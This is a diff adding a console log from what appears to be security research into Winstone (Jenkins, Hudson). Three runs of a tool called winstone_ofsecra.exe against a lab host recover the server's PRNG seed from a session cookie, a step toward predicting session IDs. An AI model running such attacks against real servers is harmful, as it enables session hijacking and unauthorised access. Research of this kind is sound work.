@@ -1,0 +1,20 @@
+D:\SessionId Research\Winstone (Jenkins, Hudson)\Ñ++ Python>winstone_ofsecra.exe
+ -i 192.168.66.3 -c 3439187822907c37529816c06be6086c -p 8080 -t 1389722755000 -s
+ 1389723926000 -r 512 -e 70
+[!] Param found: timeMillis=1389723926751 PRNGMillis=1389722800859 Seek=2 seed=2
+69066080065306
+Finished in 581 sec.
+
+D:\SessionId Research\Winstone (Jenkins, Hudson)\Ñ++ Python>winstone_ofsecra.exe
+ -i 192.168.66.3 -c 3439187822907c37529816c06be6086c -p 8080 -t 1389722755000 -s
+ 1389723926000 -r 5 -e 70
+[!] Param found: timeMillis=1389723926751 PRNGMillis=1389722800859 Seek=2 seed=2
+69066080065306
+Finished in 96 sec.
+
+D:\SessionId Research\Winstone (Jenkins, Hudson)\Ñ++ Python>winstone_ofsecra.exe
+ -i 192.168.66.3 -c 3439187822907c37529816c06be6086c -p 8080 -t 1389722755000 -s
+ 1389723926000 -r 4 -e 70
+[!] Param found: timeMillis=1389723926751 PRNGMillis=1389722800859 Seek=2 seed=2
+69066080065306
+Finished in 172 sec.
